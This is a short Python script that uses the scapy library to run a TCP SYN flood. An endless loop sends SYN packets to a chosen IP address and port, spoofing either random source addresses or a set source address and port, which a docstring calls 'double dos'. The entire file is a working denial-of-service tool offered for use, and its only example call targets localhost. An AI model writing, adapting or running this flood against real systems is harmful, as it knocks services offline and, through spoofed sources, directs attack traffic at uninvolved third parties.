from scapy.all import *
from scapy.layers.inet import IP, TCP
def syn_flood(Ip,port,flag):
    if flag[0]==0:
        srcaddr=RandIP()
        srcport=22
    else:
        srcaddr=flag[1]
        srcport=flag[2]

    
    while True:
        if flag[0]==0:
            srcaddr=RandIP()
        pkt=IP(dst=Ip,src=srcaddr)/TCP(sport=srcport,dport=port,seq=26179,flags="S")
        print("Sending packets to ",Ip,"at port",port)
        print("Source is set to ",srcaddr," at port",srcport)
        send(pkt)
#syn_flood("127.0.0.1",23,[0])

'''Template of flag[] is 
flag[0]=0 for random source, 1 for double dos
flag[1]=srcaddr in case flag[0]=1
flag[2]=srcport in case flag[0]=1'''